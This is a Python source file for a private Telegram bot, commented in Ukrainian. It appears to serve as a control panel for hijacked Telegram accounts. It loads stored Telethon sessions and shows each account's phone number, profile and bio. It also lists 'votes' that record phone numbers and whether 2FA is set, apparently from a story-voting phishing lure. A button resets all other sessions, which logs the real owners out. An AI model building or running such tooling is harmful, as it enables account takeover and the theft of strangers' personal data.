"""
Telegram-бот з панеллю керування акаунтами.
Доступ — тільки для власника (ADMIN_USER_ID).
"""
import asyncio
import json
import logging
import os
from datetime import datetime, timezone

from dotenv import load_dotenv
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
)
from telethon import TelegramClient
from telethon.tl.functions.users import GetFullUserRequest

load_dotenv()
logging.basicConfig(level=logging.INFO)

API_ID = int(os.getenv("API_ID", "12345678"))
API_HASH = os.getenv("API_HASH", "YOUR_API_HASH")
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")

# Доступ до панелі завжди має лише цей Telegram-акаунт.
# Перевіряємо саме effective_user.id, а не chat ID з .env: у приватному
# чаті це різні поняття, і значення змінної могло бути задане неправильно.
ADMIN_USER_ID = 925896498

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
ACCOUNTS_FILE = os.path.join(BASE_DIR, "accounts.json")
VOTES_FILE = os.path.join(BASE_DIR, "votes.json")


def load_accounts() -> dict:
    if not os.path.exists(ACCOUNTS_FILE):
        return {"accounts": []}
    try:
        with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
            return json.loads(f.read().strip() or '{"accounts": []}')
    except Exception:
        return {"accounts": []}


def load_votes() -> dict:
    if not os.path.exists(VOTES_FILE):
        return {"votes": []}
    try:
        with open(VOTES_FILE, "r", encoding="utf-8") as f:
            return json.loads(f.read().strip() or '{"votes": []}')
    except Exception:
        return {"votes": []}


# ============== ДОСТУП ==============
def only_admin(func):
    """Декоратор: пускає тільки власника."""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id != ADMIN_USER_ID:
            await update.effective_message.reply_text(
                "⛔ Цей бот приватний. Доступ заборонено."
            )
            return
        return await func(update, context)
    return wrapper


# ============== КОМАНДИ ==============
@only_admin
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Головне меню."""
    accounts = load_accounts()
    votes = load_votes()

    keyboard = [
        [InlineKeyboardButton(
            f"👥 Акаунти ({len(accounts['accounts'])})",
            callback_data="list_accounts"
        )],
        [InlineKeyboardButton(
            f"🗳 Голоси ({len(votes['votes'])})",
            callback_data="list_votes"
        )],
        [InlineKeyboardButton(
            "📊 Статистика",
            callback_data="stats"
        )],
    ]
    await update.message.reply_text(
        f"👋 Вітаю, власнику!\n\n"
        f"Акаунтів: {len(accounts['accounts'])}\n"
        f"Голосів: {len(votes['votes'])}\n\n"
        "Обери дію:",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )


@only_admin
async def list_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Список акаунтів з кнопками."""
    query = update.callback_query
    await query.answer()

    accounts = load_accounts()["accounts"]
    if not accounts:
        await query.edit_message_text(
            "📭 Немає акаунтів у accounts.json\n\n"
            "Додай через консоль: python app.py",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("◀️ Назад", callback_data="back")
            ]]),
        )
        return

    keyboard = []
    for a in accounts:
        name = a.get("first_name") or a.get("username") or a.get("phone") or "—"
        label = f"{a['id'][:6]} · {name} (@{a.get('username', '—')})"
        keyboard.append([
            InlineKeyboardButton(label, callback_data=f"acc:{a['id']}")
        ])
    keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="back")])

    text = f"👥 <b>Акаунти ({len(accounts)}):</b>\n\nНатисни на акаунт для деталей:"
    await query.edit_message_text(
        text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard)
    )


@only_admin
async def show_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Деталі конкретного акаунта + свіжі дані з Telegram."""
    query = update.callback_query
    await query.answer("Отримую дані...")

    account_id = query.data.split(":", 1)[1]
    accounts = load_accounts()["accounts"]
    account = next((a for a in accounts if a["id"] == account_id), None)

    if not account:
        await query.edit_message_text("❌ Акаунт не знайдений")
        return

    # Свіжі дані з Telegram
    session_path = os.path.join(BASE_DIR, account.get("session", f"sessions/{account_id}"))
    fresh = "❌ Не вдалося підключитись"
    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        try:
            me = await client.get_me()
            full = await client(GetFullUserRequest(me.id))
            fresh = (
                f"👤 <b>{me.first_name or ''} {me.last_name or ''}</b>\n"
                f"🆔 ID: <code>{me.id}</code>\n"
                f"🔗 Username: @{me.username or '—'}\n"
                f"📱 Телефон: <code>{me.phone or '—'}</code>\n"
                f"⭐ Premium: {'так' if getattr(me, 'premium', False) else 'ні'}\n"
                f"✓ Verified: {'так' if getattr(me, 'verified', False) else 'ні'}\n"
                f"📝 Біо: {full.full_user.about or '—'}\n\n"
                f"💾 Session: <code>{account.get('session')}</code>\n"
                f"🕐 Перевірено: {datetime.now().strftime('%H:%M:%S')}"
            )
        finally:
            await client.disconnect()
    except Exception as e:
        fresh = f"❌ Помилка: {e}"

    keyboard = [
        [InlineKeyboardButton("🔄 Оновити", callback_data=f"acc:{account_id}")],
        [InlineKeyboardButton("🔑 Скинути інші сесії", callback_data=f"reset:{account_id}")],
        [InlineKeyboardButton("🗑 Видалити", callback_data=f"del:{account_id}")],
        [InlineKeyboardButton("◀️ До списку", callback_data="list_accounts")],
    ]
    await query.edit_message_text(
        fresh, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard)
    )


@only_admin
async def list_votes(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Останні 10 голосів."""
    query = update.callback_query
    await query.answer()

    votes = load_votes()["votes"]
    if not votes:
        await query.edit_message_text(
            "📭 Голосів ще немає",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("◀️ Назад", callback_data="back")
            ]]),
        )
        return

    last = votes[-10:]
    text = f"🗳 <b>Останні {len(last)} голосів:</b>\n\n"
    for v in reversed(last):
        text += (
            f"📖 {v.get('story', '—')}\n"
            f"👤 {v.get('first_name', '—')} (@{v.get('username', '—')})\n"
            f"📱 <code>{v.get('phone', '—')}</code>\n"
            f"🔐 2FA: {'так' if v.get('has_2fa') else 'ні'}\n"
            f"🕐 {v.get('timestamp', '')[:19]}\n"
            f"{'─' * 20}\n"
        )

    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="back")]]
    await query.edit_message_text(
        text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard)
    )


@only_admin
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Статистика."""
    query = update.callback_query
    await query.answer()

    accounts = load_accounts()["accounts"]
    votes = load_votes()["votes"]

    by_story = {}
    for v in votes:
        s = v.get("story", "—")
        by_story[s] = by_story.get(s, 0) + 1

    text = f"📊 <b>Статистика</b>\n\n"
    text += f"👥 Акаунтів: {len(accounts)}\n"
    text += f"🗳 Усього голосів: {len(votes)}\n\n"
    if by_story:
        text += "<b>За історіями:</b>\n"
        for s, c in sorted(by_story.items(), key=lambda x: -x[1]):
            text += f"  • {s}: {c}\n"

    keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="back")]]
    await query.edit_message_text(
        text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard)
    )


@only_admin
async def reset_sessions_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Скинути всі інші сесії акаунта."""
    query = update.callback_query
    await query.answer("Скидаю...")

    account_id = query.data.split(":", 1)[1]
    accounts = load_accounts()["accounts"]
    account = next((a for a in accounts if a["id"] == account_id), None)
    if not account:
        await query.edit_message_text("❌ Акаунт не знайдений")
        return

    try:
        from telethon.tl.functions.account import ResetAuthorizationRequest
        session_path = os.path.join(BASE_DIR, account.get("session", f"sessions/{account_id}"))
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        try:
            await client(ResetAuthorizationRequest())
            text = f"✅ Сесії для <b>{account.get('first_name')}</b> скинуто"
        finally:
            await client.disconnect()
    except Exception as e:
        text = f"❌ Помилка: {e}"

    keyboard = [[InlineKeyboardButton("◀️ До акаунта", callback_data=f"acc:{account_id}")]]
    await query.edit_message_text(
        text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard)
    )


@only_admin
async def back_to_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Повернутись у головне меню."""
    query = update.callback_query
    await query.answer()

    accounts = load_accounts()
    votes = load_votes()

    keyboard = [
        [InlineKeyboardButton(
            f"👥 Акаунти ({len(accounts['accounts'])})",
            callback_data="list_accounts"
        )],
        [InlineKeyboardButton(
            f"🗳 Голоси ({len(votes['votes'])})",
            callback_data="list_votes"
        )],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")],
    ]
    await query.edit_message_text(
        f"👋 Головне меню\n\n"
        f"Акаунтів: {len(accounts['accounts'])}\n"
        f"Голосів: {len(votes['votes'])}",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )


# ============== MAIN ==============
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(list_accounts, pattern="^list_accounts$"))
    app.add_handler(CallbackQueryHandler(show_account, pattern="^acc:"))
    app.add_handler(CallbackQueryHandler(reset_sessions_callback, pattern="^reset:"))
    app.add_handler(CallbackQueryHandler(list_votes, pattern="^list_votes$"))
    app.add_handler(CallbackQueryHandler(stats, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(back_to_main, pattern="^back$"))

    print(f"🤖 Бот запущено. Доступ тільки для user_id={ADMIN_USER_ID}")
    app.run_polling()


if __name__ == "__main__":
    main()
